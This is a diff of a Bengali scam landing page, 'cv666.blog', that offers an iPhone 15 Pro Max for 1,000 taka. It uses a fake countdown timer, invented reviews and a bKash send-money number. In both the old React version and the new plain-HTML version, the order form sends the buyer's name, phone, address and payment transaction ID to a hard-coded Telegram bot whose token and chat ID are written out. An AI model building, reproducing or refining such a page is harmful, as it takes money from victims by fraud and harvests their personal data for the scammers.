@@ -1,235 +1,144 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>cv666.blog - iPhone 15 Pro Max Offer</title>
-    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* বাংলা ফন্ট */
-        @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap');
-        body { font-family: 'Hind Siliguri', sans-serif; background-color: #004d40; color: white; margin: 0; padding: 0; overflow-x: hidden; }
-        
-        /* কাস্টম ডার্ক থিম রঙ */
-        .bg-dark-green { background-color: #004d40; } /* Main Background from image_8.png */
-        .bg-popup-dark { background-color: rgba(0, 0, 0, 0.85); } /* Popup Background from image_9.png */
-        .border-gold { border-color: #bfa071; }
+        @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap');
+        body { font-family: 'Hind Siliguri', sans-serif; background-color: #004d40; color: white; margin: 0; }
+        .bg-dark-green { background-color: #004d40; }
         .text-gold { color: #bfa071; }
-        .text-light-green { color: #ccff90; }
-
-        /* বাটন স্টাইল */
-        .btn-buy {
-            background: linear-gradient(180deg, #4da6ff 0%, #0066cc 100%);
-            box-shadow: 0 4px 15px rgba(0, 102, 204, 0.4);
-        }
-        .btn-confirm {
-            background-color: #00e676; /* Green from image_9.png */
-            box-shadow: 0 0 15px rgba(0, 230, 118, 0.7);
-        }
-
-        /* ইনপুট ফিল্ড স্টাইল (image_9.png অনুযায়ী) */
-        .input-dark {
-            background-color: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
-            color: white;
-            padding: 12px;
-            width: 100%;
-        }
-        .input-dark::placeholder { color: rgba(255, 255, 255, 0.5); font-size: 14px; }
+        .btn-buy { background: linear-gradient(180deg, #4da6ff 0%, #0066cc 100%); }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+        .modal.active { display: flex; }
     </style>
 </head>
 <body>
-    <div id="root"></div>
+    <div class="max-w-md mx-auto bg-dark-green min-h-screen pb-24 shadow-2xl relative">
+        <div class="flex items-center justify-between p-4 border-b border-white/10">
+            <div class="text-xl font-bold">cv666.blog</div>
+            <div class="flex gap-4 opacity-50 text-xl">🔍 🛒 ❤️</div>
+        </div>
 
-    <script type="text/babel">
-        const { useState, useEffect } = React;
+        <div class="bg-red-700 text-white text-center py-2 font-bold text-lg sticky top-0 z-50 shadow-md">
+            OFFER ENDS IN: <span id="timer" class="text-yellow-400 font-mono">29:58 MINS</span>
+        </div>
 
-        const MainLandingPage = () => {
-            const [timeLeft, setTimeLeft] = useState(1798); // 29:58 MINS from image_8.png
-            const [showOrderPopup, setShowOrderPopup] = useState(false);
-            const [showConfirmPopup, setShowConfirmPopup] = useState(false);
-
-            // টেলিগ্রাম বোটের তথ্য (আপনার তথ্য বসান)
-            const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ"; 
-            const CHAT_ID = "5085997009"; 
-
-            // মেইন প্রোডাক্ট ছবি (image_8.png থেকে)
-            const mainProductImg = "https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png";
-
-            // কাস্টমার রিভিউ ডেটা (আপনার ছবি ও বাংলা রিভিউ)
-            const reviews = [
-                { name: "Rafiqul Islam", img: "https://i.ibb.co.com/ccCJWnFt/pngwing-com.png", comment: "১০০০ টাকায় আইফোন! ভাবতেই পারছি না।" },
-                { name: "Sultana Kamal", img: "https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png", comment: "হাতে পাওয়ার পর অবাক হয়ে গেছি।" },
-                { name: "Anisur Rahman", img: "https://i.ibb.co.com/bgBP1D78/3f82de66235c46865d5276b1b69ba22f.png", comment: "সেরা অফার! ধন্যবাদ।" }
-            ];
-
-            // টাইম কাউন্টডাউন
-            useEffect(() => {
-                const timer = setInterval(() => {
-                    setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
-                }, 1000);
-                return () => clearInterval(timer);
-            }, []);
-
-            const formatTime = (s) => {
-                const mins = Math.floor(s / 60);
-                const secs = s % 60;
-                return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')} MINS`;
-            };
-
-            // অর্ডার সাবমিট ফাংশন
-            const handleOrderSubmit = async (e) => {
-                e.preventDefault();
-                const name = e.target.name.value;
-                const phone = e.target.phone.value;
-                const address = e.target.address.value;
-                const trxId = e.target.trxId.value;
-
-                const telegramMessage = `🚀 **নতুন প্রিমিয়াম অর্ডার!**\n━━━━━━━━━━━━━\n👤 নাম: ${name}\n📞 নাম্বার: ${phone}\n🏠 ঠিকানা: ${address}\n💰 TrxID: ${trxId}\n━━━━━━━━━━━━━`;
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: telegramMessage, parse_mode: 'Markdown' }),
-                    });
-                    setShowOrderPopup(false);
-                    setShowConfirmPopup(true);
-                } catch (err) { alert("সমস্যা হয়েছে, আবার চেষ্টা করুন।"); }
-            };
-
-            return (
-                <div className="max-w-md mx-auto bg-dark-green min-h-screen relative pb-20">
-                    {/* Header: search, cart, heart from image_8.png */}
-                    <div className="flex items-center justify-between p-4 border-b border-gray-700">
-                        <div className="text-xl font-bold">cv666.blog</div>
-                        <div className="flex gap-4 text-gray-400">
-                            <span>🔍</span> <span>🛒</span> <span>❤️</span>
-                        </div>
-                    </div>
-
-                    {/* Flash Sale Bar: image_8.png অনুযায়ী */}
-                    <div className="bg-red-800 text-white text-center py-2 font-bold text-lg">
-                        OFFER ENDS IN: <span className="text-yellow-400">{formatTime(timeLeft)}</span>
-                    </div>
-
-                    {/* Main Content (image_8.png অনুযায়ী UI) */}
-                    <div className="p-6">
-                        <div className="flex gap-4 items-center">
-                            <img src={mainProductImg} className="w-1/2 h-auto object-contain" alt="iPhone 15 Pro Max" />
-                            <div className="w-1/2 space-y-2">
-                                <h1 className="text-2xl font-bold">iPhone 15 Pro Max</h1>
-                                <p className="text-4xl font-black text-light-green">ONLY 1,000TK!</p>
-                                <p className="text-sm text-gold">LIMITED TIME! 99% OFF!</p>
-                                <p className="text-[10px] text-gray-400 leading-tight">CV886 website is operated... regulated by Gaming Services...</p>
-                            </div>
-                        </div>
-
-                        {/* Options: Color, Storage */}
-                        <div className="flex gap-4 mt-6">
-                            <div className="w-1/2 p-3 border border-gray-600 rounded-full text-center text-sm">Color: Natural Titanium ▼</div>
-                            <div className="w-1/2 p-3 border border-gray-600 rounded-full text-center text-sm">Storage: 256GB ▼</div>
-                        </div>
-
-                        {/* Customer Reviews Section */}
-                        <div className="mt-8">
-                            <h3 className="text-center text-lg font-bold text-gold mb-4">Customer Reviews</h3>
-                            <div className="grid grid-cols-2 gap-4">
-                                {reviews.map((r, i) => (
-                                    <div key={i} className="bg-white text-gray-900 p-4 rounded-xl text-center space-y-2 shadow-lg">
-                                        <img src={r.img} className="w-12 h-12 rounded-full mx-auto object-cover" alt={r.name} />
-                                        <div className="text-yellow-500 text-xs">★★★★★</div>
-                                        <p className="text-xs leading-tight font-medium">"{r.comment}"</p>
-                                    </div>
-                                ))}
-                            </div>
-                        </div>
-
-                        {/* Main BUY NOW Button from image_8.png */}
-                        <button 
-                            onClick={() => setShowOrderPopup(true)}
-                            className="w-full mt-10 py-5 rounded-full text-2xl font-black btn-buy text-white flex items-center justify-center gap-2 shadow-2xl"
-                        ) {
-                            <span className="text-3xl">🛩️</span> BUY NOW
-                        }</button>
-                    </div>
-
-                    {/* Footer Nav from image_8.png */}
-                    <div className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white text-gray-600 p-4 border-t flex justify-around text-xs z-40">
-                        <div className="text-center text-green-700 font-bold">🏠<br/>Home</div>
-                        <div className="text-center">🛒<br/>Shop</div>
-                        <div className="text-center">👤<br/>Account</div>
-                        <div className="text-center">❤️<br/>Wishlist</div>
-                    </div>
-
-                    {/* Order Form Popup (image_9.png অনুযায়ী) */}
-                    {showOrderPopup && (
-                        <div className="fixed inset-0 max-w-md mx-auto z-[100] bg-popup-dark flex items-center justify-center p-6 animate-fadeIn">
-                            <div className="w-full relative space-y-6">
-                                {/* Close Button */}
-                                <button onClick={() => setShowOrderPopup(false)} className="absolute -top-10 -right-2 text-white text-3xl font-bold">×</button>
-                                
-                                <h2 className="text-4xl font-black text-center text-white italic">অর্ডার ফর্ম</h2>
-
-                                <form onSubmit={handleOrderSubmit} className="space-y-4">
-                                    {/* Payment Info Section */}
-                                    <div className="border border-gold rounded-2xl p-6 bg-black/30 space-y-3">
-                                        <p className="text-2xl font-bold text-gold italic text-center">বিকাশ পেমেন্ট তথ্য</p>
-                                        <p className="text-base text-white text-center">বিকাশ (সেন্ড মানি) ১,০০০৳ করুন:</p>
-                                        <p className="text-4xl font-black text-white text-center tracking-widest">01870428306</p>
-                                        <input type="text" name="trxId" placeholder="ট্রানজাকশন আইডি (TrxID)" className="input-dark mt-2" required />
-                                    </div>
-
-                                    {/* Address Info Section */}
-                                    <div className="border border-gold rounded-2xl p-6 bg-black/30 space-y-3">
-                                        <p className="text-2xl font-bold text-gold italic text-center">আপনার ঠিকানা</p>
-                                        <input type="text" name="name" placeholder="👤 পূর্ণ নাম" className="input-dark" required />
-                                        <input type="tel" name="phone" placeholder="📞 মোবাইল নাম্বার" className="input-dark" required />
-                                        <textarea name="address" placeholder="📍 বিস্তারিত ঠিকানা" className="input-dark" rows="2" required></textarea>
-                                    </div>
-
-                                    {/* Confirm Button from image_9.png */}
-                                    <button type="submit" className="w-full py-4 rounded-full text-xl font-bold btn-confirm text-gray-900 shadow-lg active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
-                                </form>
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Order Confirm Popup (image_10.png অনুযায়ী) */}
-                    {showConfirmPopup && (
-                        <div className="fixed inset-0 max-w-md mx-auto z-[100] bg-popup-dark flex items-center justify-center p-6 animate-fadeIn">
-                            <div className="w-full bg-white text-gray-900 rounded-[40px] p-10 text-center shadow-2xl relative">
-                                <button onClick={() => setShowConfirmPopup(false)} className="absolute top-4 right-6 text-gray-400 text-3xl font-bold">×</button>
-                                <h2 className="text-3xl font-black italic mb-6">অর্ডার কনফার্মড!</h2>
-                                
-                                {/* Info details like image_10.png */}
-                                <div className="space-y-3 text-left bg-gray-100 p-4 rounded-2xl mb-6">
-                                    <p className="text-sm">👤 **পূর্ণ নাম:** মো. আব্দুর রহিম</p>
-                                    <p className="text-sm">📞 **মোবাইল নাম্বার:** 01812345678</p>
-                                    <p className="text-sm">📍 **বিস্তারিত ঠিকানা:** হাউস ১০, রোড ৫, উত্তরা, ঢাকা</p>
-                                </div>
-
-                                {/* Confirmation Box with Green Background */}
-                                <div className="bg-[#b9f6ca] rounded-3xl p-8 space-y-4">
-                                    <div className="text-7xl">🎁</div>
-                                    <h3 className="text-3xl font-black">ধন্যবাদ!</h3>
-                                    <p className="text-sm text-gray-700">আপনার অর্ডারটি গ্রহণ করা হয়েছে এবং খুব শীঘ্রই ডেলিভারি দেওয়া হবে।</p>
-                                    <button className="w-full py-3 bg-[#00c853] text-white rounded-full font-bold text-sm flex items-center justify-center gap-2">(( অর্ডার ট্র্যাক করুন ))</button>
-                                    <button onClick={() => setShowConfirmPopup(false)} className="w-full py-3 bg-gray-500 text-white rounded-full font-bold text-sm">হোমে ফিরে যান</button>
-                                </div>
-                            </div>
-                        </div>
-                    )}
+        <div class="p-6">
+            <div class="flex gap-4 items-center">
+                <img src="https://i.ibb.co.com/gbyH4tY2/50a71c0303bca79fc4d2fae2ca50cfd1.png" class="w-1/2 drop-shadow-2xl" alt="iPhone">
+                <div class="w-1/2 space-y-2">
+                    <h1 class="text-2xl font-bold italic">iPhone 15 Pro Max</h1>
+                    <p class="text-4xl font-black text-green-400 leading-none">ONLY 1,000TK!</p>
+                    <p class="text-sm text-gold font-bold uppercase tracking-tighter">LIMITED TIME! 99% OFF!</p>
+                    <p class="text-[10px] text-gray-300 leading-tight opacity-60">CV886 website is operated by Gaming Services under license 355JAZ.</p>
                 </div>
-            );
-        };
+            </div>
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<MainLandingPage />);
+            <div class="flex gap-2 mt-6">
+                <div class="flex-1 p-3 border border-white/20 rounded-xl text-center text-xs bg-white/5">Color: Natural Titanium ▼</div>
+                <div class="flex-1 p-3 border border-white/20 rounded-xl text-center text-xs bg-white/5">Storage: 256GB ▼</div>
+            </div>
+
+            <div class="mt-8">
+                <h3 class="text-center text-lg font-bold text-gold mb-4 italic tracking-widest uppercase">Customer Reviews</h3>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-white text-gray-900 p-4 rounded-2xl text-center shadow-lg transform scale-95">
+                        <img src="https://i.ibb.co.com/ccCJWnFt/pngwing-com.png" class="w-12 h-12 rounded-full mx-auto border-2 border-green-500 mb-2">
+                        <div class="text-yellow-500 text-xs mb-1">★★★★★</div>
+                        <p class="text-[11px] font-bold leading-tight">"১০০০ টাকায় আইফোন ভাবতেই পারছি না!"</p>
+                    </div>
+                    <div class="bg-white text-gray-900 p-4 rounded-2xl text-center shadow-lg transform scale-95">
+                        <img src="https://i.ibb.co.com/jvvx7964/7027ce0fdbb92010a312f4814bb04afc.png" class="w-12 h-12 rounded-full mx-auto border-2 border-green-500 mb-2">
+                        <div class="text-yellow-500 text-xs mb-1">★★★★★</div>
+                        <p class="text-[11px] font-bold leading-tight">"হাতে পাওয়ার পর অবাক হয়ে গেছি!"</p>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="openOrder()" class="w-full mt-10 py-5 rounded-full text-2xl font-black btn-buy text-white shadow-2xl flex items-center justify-center gap-3 active:scale-95 transition-all">
+                <span class="text-3xl animate-bounce">🚀</span> BUY NOW
+            </button>
+        </div>
+
+        <div class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white text-gray-500 p-4 border-t flex justify-around text-[10px] z-40 shadow-[0_-5px_20px_rgba(0,0,0,0.1)]">
+            <div class="text-center text-green-800 font-bold opacity-100">🏠<br>Home</div>
+            <div class="text-center">🛒<br>Shop</div>
+            <div class="text-center">👤<br>Account</div>
+            <div class="text-center">❤️<br>Wishlist</div>
+        </div>
+    </div>
+
+    <div id="orderModal" class="modal">
+        <div class="w-full max-w-sm relative">
+            <button onclick="closeOrder()" class="absolute -top-12 right-0 text-white text-4xl">&times;</button>
+            <h2 class="text-4xl font-black text-center mb-6 italic tracking-tighter">অর্ডার ফর্ম</h2>
+            
+            <form id="orderForm" class="space-y-4">
+                <div class="border-2 border-gold rounded-3xl p-5 bg-black/40">
+                    <p class="text-xl font-bold text-gold text-center italic mb-2">বিকাশ পেমেন্ট তথ্য</p>
+                    <p class="text-xs text-center mb-2">বিকাশ (সেন্ড মানি) ১,০০০৳ করুন:</p>
+                    <p class="text-3xl font-black text-center tracking-widest text-white mb-4">01870428306</p>
+                    <input type="text" id="trxId" placeholder="ট্রানজাকশন আইডি (TrxID)" class="w-full p-4 bg-white/10 border border-white/20 rounded-xl text-white outline-none focus:border-gold" required>
+                </div>
+
+                <div class="border-2 border-gold rounded-3xl p-5 bg-black/40 space-y-3">
+                    <p class="text-xl font-bold text-gold text-center italic mb-2">আপনার ঠিকানা</p>
+                    <input type="text" id="custName" placeholder="👤 পূর্ণ নাম" class="w-full p-4 bg-white/10 border border-white/20 rounded-xl text-white outline-none focus:border-gold" required>
+                    <input type="tel" id="custPhone" placeholder="📞 মোবাইল নাম্বার" class="w-full p-4 bg-white/10 border border-white/20 rounded-xl text-white outline-none focus:border-gold" required>
+                    <textarea id="custAddress" placeholder="📍 বিস্তারিত ঠিকানা" class="w-full p-4 bg-white/10 border border-white/20 rounded-xl text-white outline-none focus:border-gold" required></textarea>
+                </div>
+
+                <button type="submit" class="w-full py-5 rounded-full bg-green-500 text-black font-black text-xl shadow-[0_0_20px_#22c55e] active:scale-95 transition-all">অর্ডার কনফার্ম করুন</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="successModal" class="modal">
+        <div class="bg-white text-gray-900 rounded-[40px] p-8 text-center max-w-sm shadow-2xl">
+            <h2 class="text-3xl font-black italic mb-4">অর্ডার কনফার্মড!</h2>
+            <div class="bg-green-100 rounded-3xl p-6 space-y-4">
+                <div class="text-6xl animate-bounce">🎁</div>
+                <h3 class="text-2xl font-black">ধন্যবাদ!</h3>
+                <p class="text-sm text-gray-600">আপনার অর্ডারটি গ্রহণ করা হয়েছে এবং খুব শীঘ্রই ডেলিভারি দেওয়া হবে।</p>
+                <button onclick="location.reload()" class="w-full py-4 bg-green-600 text-white rounded-full font-bold shadow-lg">হোমে ফিরে যান</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Timer Logic
+        let time = 1798;
+        const timerEl = document.getElementById('timer');
+        setInterval(() => {
+            if(time <= 0) return;
+            time--;
+            let mins = Math.floor(time / 60);
+            let secs = time % 60;
+            timerEl.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')} MINS`;
+        }, 1000);
+
+        // Modal Logic
+        function openOrder() { document.getElementById('orderModal').classList.add('active'); }
+        function closeOrder() { document.getElementById('orderModal').classList.remove('active'); }
+
+        // Form Logic
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const msg = `🚀 **নতুন অর্ডার!**\n👤 নাম: ${document.getElementById('custName').value}\n📞 ফোন: ${document.getElementById('custPhone').value}\n🏠 ঠিকানা: ${document.getElementById('custAddress').value}\n💰 TrxID: ${document.getElementById('trxId').value}`;
+            
+            fetch(`https://api.telegram.org/bot8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: "5085997009", text: msg, parse_mode: 'Markdown' })
+            }).then(() => {
+                document.getElementById('orderModal').classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
+            });
+        });
     </script>
 </body>
 </html>
